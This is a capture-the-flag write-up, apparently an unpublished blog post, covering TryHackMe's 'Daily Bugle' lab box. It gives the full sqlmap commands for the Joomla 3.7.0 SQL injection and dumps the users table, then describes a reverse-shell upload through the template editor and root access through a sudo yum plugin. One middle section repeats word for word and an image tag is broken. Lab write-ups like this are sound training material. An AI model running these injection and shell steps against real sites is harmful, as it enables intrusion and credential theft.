---
title: Daily Bugle Writeup
published: false
---
# TryHackMe - Daily Bugle  
___________________________
![](assets/images/dailybugle/dailybugle_joomlalogin.png)
<br>
<br>

This continues my offensive security path on [TryHackMe](https://tryhackme.com/room/dailybugle). This room involves some sqli, cracking hashes, and priv esc with yum. As always I'll start with my standard `nmap` scan of the box.
<br>
<br>

## nmap scan

```
nmap -sC -sV -oN nmap/daily_initialnmap.txt 10.10.203.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 12:05 EDT
Nmap scan report for 10.10.203.11
Host is up (0.20s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open     http          Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
1119/tcp filtered bnetgame
1152/tcp filtered winpoplanmess
3306/tcp open     mysql         MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.75 seconds
```
<br>
<br>

It looks like we have port 22 and port 80 open. There's a website with disallowed entries on `robots.txt` and looks to be running Joomla CMS.
<br>
<br>

## web enumeration

The page is pretty basic for the most part. Looks like one post about spider-man robbing a bank. There's a login form to the side that gives us an interesting url to test for sqli. Testing out the robots.txt disallowed entries leads me to a Joomla login page. It turns out that in the repos for kali there is a tool for enumerating Joomla called `joomscan`. We can download the tool with `sudo apt install joomscan`. Once installed we can run it on the box with `joomscan -u http://10.10.60.90/`. It returns all kinds of valuable info such as firewalls, version info, and robots.txt disallowed entries (although we already knew those from the nmap scan). Turns out we're dealing with `Joomla 3.7.0` which has a known exploit on [exploit-db](https://www.exploit-db.com/exploits/42033). While this is not a manual exploit, it gives us valuable info on how to run sqlmap to get a database dump. It contains the following command:
<br>
<br>

`sqlmap -u "http://<machine-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs`
<br>
<br>

Now, this command gives us a dump of the databases, but once it returns we'll need to run it again with a more specific `-D` to specify one of the databases to dump. A tool like `SQLmap`, while great is not allowed on the OSCP, so I may go back and try it with a manual exploit (assuming there is one), but for now I need some more practice with `SQLmap` so I'm not too concerned about it at this point.
<br>
<br>



![](assets/images/dailybugle/dailybugle_dbs.png)
<br>
<br>

This is a list of the databases on the backend of the daily bugle's site. The most interesting looking database is the `joomla` database because it probably contains user info for the CMS. We'll use `SQLmap` again with a more specific argument to see if we can dump the database.
<br>
<br>

```
sqlmap -u "http://<machine-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla --tables

Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
...
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

```
<br>
<br>

The most interesting table is the users table, so lets get more specific with sqlmap. The following command will dump all the columns in the selected table of the database. Admittedly once I saw the password entry in the table I stopped `SQLmap`. Otherwise it would've taken forever.
<br>
<br>

```
sqlmap -u "http://<machine-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T '#__users' --columns

Database: joomla
Table: #__users
[5 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| id       | numeric     |
| name     | non-numeric |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+
```
<br>
<br>

Finally we can run the following `SQLmap` command which will dump the specified columns of the `#__users` table on the `joomla` database. This should give us a username and hopefully a password hash.
<br>
<br>

`sqlmap -u "http://10.10.100.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T '#__users' -C 'username, email, password, id' --dump`
<br>
<br>

![](

![](assets/images/dailybugle/dailybugle_dbs.png)
<br>
<br>

This is a list of the databases on the backend of the daily bugle's site. The most interesting looking database is the `joomla` database because it probably contains user info for the CMS. We'll use `SQLmap` again with a more specific argument to see if we can dump the database.
<br>
<br>

```
sqlmap -u "http://<machine-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla --tables

Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
...
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

```
<br>
<br>

The most interesting table is the users table, so lets get more specific with sqlmap. The following command will dump all the columns in the selected table of the database. Admittedly once I saw the password entry in the table I stopped `SQLmap`. Otherwise it would've taken forever.
<br>
<br>

```
sqlmap -u "http://<machine-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T '#__users' --columns

Database: joomla
Table: #__users
[5 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| id       | numeric     |
| name     | non-numeric |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+
```
<br>
<br>

Finally we can run the following `SQLmap` command which will dump the specified columns of the `#__users` table on the `joomla` database. This should give us a username and hopefully a password hash.
<br>
<br>

`sqlmap -u "http://10.10.100.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T '#__users' -C 'username, email, password, id' --dump`
<br>
<br>

Now that we have a password has we can use `johntheripper` which comes pre-installed on kali, to identify the type of hash and break it.
<br>
<br>

![](assets/images/dailybugle/dailybugle_pass.png)
<br>
<br>


## initial foothold

Once inside of the admin panel for the `joomla` CMS, the plan is to upload a reverse shell that calls back to my kali machine. Replacing the index.php page of either template we have available and then previewing the template will execute our reverse shell. We'll need to make sure that we have a netcat listener on our attacking machine before we execute the reverse shell.
<br>
<br>

![](assets/images/dailybugle/dailybugle_upload.png)
<br>
<br>


## user.txt

Once on the victim machine, we have to do some enumeration. The first thing I like to do is visit the `/home` directory to see what kind of usernames I'm dealing with. After that, I'll either poke around the website to find some passwords or I'll just run [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). In this case, I'm feeling a little lazy and I'll just run linpeas.sh. After that runs I found a password from a `configuration.php` file. I tried that password on a whim for the user I discovered earlier and that got a shell as that user. Now it's time to get a more stable shell and get on the box via ssh and grab the user flag.
<br>
<br>

![](assets/images/dailybugle/dailybugle_peas.png)
<br>
<br>

![](assets/images/dailybugle/dailybugle_user.png)
<br>
<br>

## root.txt

One of the first things I do when I'm trying to get root is run `sudo -l` to give me a list of all the commands I can run as root. This one returns the following line:

`(ALL) NOPASSWD: /usr/bin/yum`

Anytime I encounter a situation like this I head to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/). Taking a look at yum, which is a package manager for red hat, like apt is for debian (is my understanding, I've never run fedora, #debian based distros ftw), it appears we can simply do some copy and pasting from (b) section on the article on yum which enables a yum plugin that dumps us into a root shell.
<br>
<br>

![](assets/images/dailybugle/dailybugle_root.png)
<br>
<br>

## final thoughts

This one was a doozy. I think the `SQLmap` was the hardest part of this room. The admin panel took a minute as well to figure out where I needed to upload. The root was probably the easiest part. Anyway, I learned a good amount and I got some practice with `SQLmap` as well. Thanks for reading if you've come this far!
<br>
<br>
